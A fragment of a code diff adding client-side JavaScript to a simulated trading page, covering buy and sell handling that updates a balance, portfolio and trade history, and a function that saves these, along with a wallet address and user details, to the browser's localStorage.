+            balance -= cost;
+            portfolio[asset] += amount;
+            tradingHistory.push({
+                date: new Date().toLocaleDateString(),
+                action,
+                asset,
+                amount,
+                price
+            });
+            document.getElementById('balance').textContent = `Balance: $${balance}`;
+            alert(`Bought ${amount} ${asset} at $${price} each!`);
+        } else {
+            alert('Insufficient balance to buy.');
+        }
+    } else if (action === 'Sell') {
+        if (portfolio[asset] >= amount) {
+            balance += amount * price;
+            portfolio[asset] -= amount;
+            tradingHistory.push({
+                date: new Date().toLocaleDateString(),
+                action,
+                asset,
+                amount,
+                price
+            });
+            document.getElementById('balance').textContent = `Balance: $${balance}`;
+            alert(`Sold ${amount} ${asset} at $${price} each!`);
+        } else {
+            alert('Insufficient assets to sell.');
+        }
+    }
+    saveToLocalStorage();
+}
+
+function saveToLocalStorage() {
+    localStorage.setItem('balance', balance);
+    localStorage.setItem('hasDeposited50', hasDeposited50);
+    localStorage.setItem('dailyReturns', dailyReturns);
+    localStorage.setItem('portfolio', JSON.stringify(portfolio));
+    localStorage.setItem('tradingHistory', JSON.stringify(tradingHistory));
+    localStorage.setItem('lastReturnTime', lastReturnTime);
+    localStorage.setItem('walletAddress', walletAddress);
+    localStorage.setItem('userDetails', JSON.stringify(userDetails));
+}</script></body></html>
